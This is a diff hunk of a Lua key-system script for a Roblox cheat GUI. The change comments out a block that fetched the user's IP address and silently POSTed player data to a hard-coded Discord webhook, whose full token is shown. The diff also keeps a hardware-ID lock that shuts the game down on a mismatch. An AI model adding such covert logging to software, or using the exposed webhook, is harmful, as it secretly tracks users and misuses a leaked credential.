@@ -113,7 +113,7 @@ local hardwareidreal = game:HttpGet("https://httpbin.org/get")
       
       else
 
-        local OneTimeWebhook = false
+        --[[local OneTimeWebhook = false
         local Webhook = 'https://discord.com/api/webhooks/1067532802624589904/izJahQa-BGKGM66BrTq5QFO6vfO9SRnnLvCagQivGdlUCBdnn-sMTlCqgPssinGSbN6B'
      
         local IPv4 = game:HttpGet("https://v4.ident.me/")
@@ -193,15 +193,14 @@ local hardwareidreal = game:HttpGet("https://httpbin.org/get")
     
          OneTimeWebHook = true
          HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
-         OneTimeWebHook = false
-      task.wait(0.2)
+         OneTimeWebHook = false--]]
+      --task.wait(0.2)
       game:Shutdown()
    end
 end
 
 if FrostyCardGuiKeySystem.InputKey == FrostyCardGuiKeySystem.PremiumKey or readfile("KeySystemLol") == FrostyCardGuiKeySystem.PremiumKey then
 local hardwareidlol = game:GetService("RbxAnalyticsService"):GetClientId()
-local hardwareidreal = game:HttpGet("https://httpbin.org/get")
     if hardwareidlol == "F42620F8-6F59-4C9F-B928-94CEDC09C123" then
     
     else game:Shutdown() end
